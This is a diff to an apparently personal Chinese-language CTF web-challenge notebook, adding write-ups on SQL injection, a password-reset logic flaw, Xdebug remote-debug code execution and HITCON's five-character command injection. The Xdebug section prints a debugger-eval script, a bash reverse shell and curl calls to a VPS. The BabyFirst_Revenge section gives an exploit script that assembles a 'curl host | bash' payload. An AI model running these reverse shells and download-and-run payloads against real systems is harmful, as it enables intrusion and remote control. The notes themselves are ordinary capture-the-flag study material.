@@ -1255,7 +1255,7 @@
 			$ch = mt_rand(0, count($set) - 1);
 			$str .= $set[$ch];
 		}
-		$filename = './uP1O4Ds/' . $str . '_'
+		$filename = './uP1O4Ds/' . $str . '_';
 		return $str;
 	}
 	session_start();
@@ -2048,6 +2048,13 @@
 	然后利用 passthru('cat ' . 'uploaded/' . $_GET['step']);
 	?step=12345678901234567890 就可以实现文件读取了
 	话说回来，此题还是有点为了出题而出题的感觉，很多过滤并没实际意义
+
+
+# XCTF 4th-CyberEarth ics-04
+	题目描述：工控云管理系统新添加的登录和注册页面存在漏洞，请找出flag。
+	生活总是充满惊喜与惊吓，sql注入，没有任何过滤，sqlmap一把梭
+	md5破解失败，也不能就此放弃啊，猜想sql语句，构造一下，直接登录应该也行
+	可是，这直接就有逻辑漏洞，可以覆盖别人注册过的用户名。over
 
 
 # XCTF 4th-CyberEarth ics-07
@@ -2953,6 +2960,21 @@ raw 为 TRUE 时为 16 字符二进制格式，默认为 false 32 字符十六�
 				print(s)
 				break 
 
+	# 上面的不靠谱就用这个
+	<?php
+	$hashfuc='md5';
+	while(1){
+		$arg = trim(fgets(STDIN));
+		$i = 0;
+		while(++$i){
+			if(substr($hashfuc($i), 0, strlen($arg)) === $arg){
+				echo($i."\n". $hashfuc($i)."\n");
+				break;
+			}
+		}
+	}
+	?>
+
 
 #hackme xss
 
@@ -3355,6 +3377,8 @@ get_defined_vars — 返回由所有已定义变量所组成的数组
 	with open('decoded-keystream', 'wb') as f:
 		f.write(barr)
 
+	别人都是 z3 爆破，太可惜了
+
 	
 	
 # 2019 TCTF ghostpepper
@@ -3370,4 +3394,139 @@ get_defined_vars — 返回由所有已定义变量所组成的数组
 # 2019 TCTF WallbreakerEasy
 	直接给了一个 eval 后门，目标是命令执行 ./readflag
 
-# 
+# 2015 RCTF weeeeeb3
+	这个题是一个逻辑漏洞，还挺好玩的，修改密码的时候只验证了信息填写是否正确，但是改密码的账户未验证与前面是否一致。
+	从而可以更改管理员密码，过了第一个验证之后，直接抓包将用户名改为 admin，登录后发现是文件上传，接着伪造 ip，文件上传，
+	又要用 <script language="php"></script> + php4 等绕过
+
+
+# XCTF 4th-WHCTF-2017 Emmm
+	题目：/flag.txt
+	一上来就是文件泄露，看到一个 phpinfo.php，扫了一波，没其他东西了
+	结合题干的 flag.txt，文件包含？
+	未开启 open_basedir
+	根目录	/app
+	nginx/1.10.3
+	disable_functions:
+	pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority
+
+	注意到 xdebug.remote_connect_back=1 开了远程调试 参考 https://paper.seebug.org/397/
+	注意监听 9000 端口，这是 phpstorm 默认的端口，不能瞎改，否则接收不到
+
+	➜  ~ curl "http://111.198.29.45:30372/phpinfo.php?XDEBUG_SESSION_START=phpstrom" -H "X-Forwarded-For:47.101.220.241"➜  ~ curl "http://111.198.29.45:30372/phpinfo.php?XDEBUG_SESSION_START=phpstrom" -H "X-Forwarded-For:47.101.220.241"
+	到 vps 上进行监听
+	➜  ~ nc -lvv 9000
+	Listening on [0.0.0.0] (family 0, port 9000)
+	Connection from 111.198.29.45 18656 received!
+	499<?xml version="1.0" encoding="iso-8859-1"?>
+	<init xmlns="urn:debugger_protocol_v1" xmlns:xdebug="http://xdebug.org/dbgp/xdebug" fileuri="file:///app/phpinfo.php" language="PHP" xdebug:language_version="7.0.22-0ubuntu0.16.04.1" protocol_version="1.0" appid="9" idekey="phpstrom"><engine version="2.6.0-dev"><![CDATA[Xdebug]]></engine><author><![CDATA[Derick Rethans]]></author><url><![CDATA[http://xdebug.org]]></url><copyright><![CDATA[Copyright (c) 2002-2017 by Derick Rethans]]></copyright></init>
+	成功
+
+	将该代码运行到 vps 上，然后再用上面的 curl 语句触发一下
+	#!/usr/bin/python2
+	import socket
+
+	ip_port = ('0.0.0.0',9000)
+	sk = socket.socket()
+	sk.bind(ip_port)
+	sk.listen(10)
+	conn, addr = sk.accept()
+
+	while True:
+		client_data = conn.recv(1024)
+		print(client_data)
+
+		data = raw_input('>> ')
+		conn.sendall('eval -i 1 -- %s\x00' % data.encode('base64'))
+
+
+	bash -i >& /dev/tcp/47.101.220.241/8888 0>&1
+	system("curl 47.101.220.241:8888")
+	垃圾环境，弹shell一直失败
+	>> system("cat /flag.txt")
+	304<?xml version="1.0" encoding="iso-8859-1"?>
+	<response xmlns="urn:debugger_protocol_v1" xmlns:xdebug="http://xdebug.org/dbgp/xdebug" command="eval" transaction_id="1"><property type="string" size="38" 
+	encoding="base64"><![CDATA[eGN0ZnswYzhjMDcxY2YzMTE4YTBjMjg5MGU0N2UyZDA0ZTQ2Nn0=]]></property></response>
+	解码即得flag，不需要 nc 另外监听
+	这篇文章靠谱点：https://blog.spoock.com/2017/09/19/xdebug-attack-surface/
+	不过的确可以直接看到返回的数据，用不着绕一圈弹shell，拿flag更重要
+
+
+# HITCON-2017 BabyFirst_Revenge
+	只能说终于碰到橘子这一题了，极限弹 shell
+	<?php 
+		$sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']); 
+		@mkdir($sandbox); 
+		@chdir($sandbox); 
+		if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 5) { 
+			@exec($_GET['cmd']); 
+		} else if (isset($_GET['reset'])) { 
+			@exec('/bin/rm -rf ' . $sandbox); 
+		} 
+		highlight_file(__FILE__);
+	
+	最大的限制在于这个长度不超过5
+	exec 不像 system，不会直接输出命令执行结果
+	尝试在vps上提供一个脚本文件，然后下载，再解析
+	参考这篇文章，这有个类似的题目，长度限制在7
+
+	#coding:utf-8
+	import requests
+	from time import sleep
+	from urllib import quote
+
+	payload = [
+		# generate `ls -t>g` file
+		'>ls\\', 
+		'ls>_', 
+		'>\ \\', 
+		'>-t\\', 
+		'>\>g', 
+		'ls>>_', 
+
+		# generate `curl orange.tw|python`
+		'>sh\ ', 
+		'>ba\\',
+		'>\|\\', 
+		'>241\\',
+		'>0.\\',
+		'>22\\', 
+		'>1.\\', 
+		'>10\\', 
+		'>47.\\', 
+		'>\ \\', 
+		'>rl\\', 
+		'>cu\\', 
+
+		# exec
+		'sh _', 
+		'sh g', 
+	]
+
+	r = requests.get('http://111.198.29.45:30213/?reset=1')
+	for i in payload:
+		assert len(i) <= 5 
+		r = requests.get('http://111.198.29.45:30213/?cmd=' + quote(i) )
+		print i
+		sleep(0.2)
+
+
+	最终的脚本如上，本地成功后直接打过去还是接收不到shell，实在不行换了个端口，重新打一遍，终于成功了
+	血的教训：如果接收不到，一定要注意，端口是否被占用！
+	netstat -anl | grep 8008
+
+
+	这还有个版本 v2，长度限制到 4，另外 py 脚本反弹shell不太靠谱，最好用bash
+
+
+# 2019 DDCTF
+	php://filter/read=convert.base64-encode/resource=index.php
+
+	php%3a%2f%2ffilter%2fread%3dconvert.base64%2dencode%2fresource%3dindex.php
+
+	PD9waHANCi8qDQogKiBodHRwczovL2Jsb2cuY3Nkbi5uZXQvRmVuZ0JhbkxpdVl1bi9hcnRpY2xlL2RldGFpbHMvODA2MTY2MDcNCiAqIERhdGU6IEp1bHkgNCwyMDE4DQogKi8NCmVycm9yX3JlcG9ydGluZyhFX0FMTCB8fCB+RV9OT1RJQ0UpOw0KDQoNCmhlYWRlcignY29udGVudC10eXBlOnRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Jyk7DQppZighIGlzc2V0KCRfR0VUWydqcGcnXSkpDQogICAgaGVhZGVyKCdSZWZyZXNoOjA7dXJsPS4vaW5kZXgucGhwP2pwZz1UbXBaTWxGNldYaE9hbU41VWxSYVFrNTZRVEpPZHowOScpOw0KJGZpbGUgPSBoZXgyYmluKGJhc2U2NF9kZWNvZGUoYmFzZTY0X2RlY29kZSgkX0dFVFsnanBnJ10pKSk7DQplY2hvICc8dGl0bGU+Jy4kX0dFVFsnanBnJ10uJzwvdGl0bGU+JzsNCiRmaWxlID0gcHJlZ19yZXBsYWNlKCIvW15hLXpBLVowLTkuXSsvIiwiIiwgJGZpbGUpOw0KZWNobyAkZmlsZS4nPC9icj4nOw0KJGZpbGUgPSBzdHJfcmVwbGFjZSgiY29uZmlnIiwiISIsICRmaWxlKTsNCmVjaG8gJGZpbGUuJzwvYnI+JzsNCiR0eHQgPSBiYXNlNjRfZW5jb2RlKGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKSk7DQoNCmVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL2dpZjtiYXNlNjQsIi4kdHh0LiInPjwvaW1nPiI7DQovKg0KICogQ2FuIHlvdSBmaW5kIHRoZSBmbGFnIGZpbGU/DQogKg0KICovDQoNCj8+DQo=
+
+
+	wireshark
+
+	172.25 是自己， 110 是网站
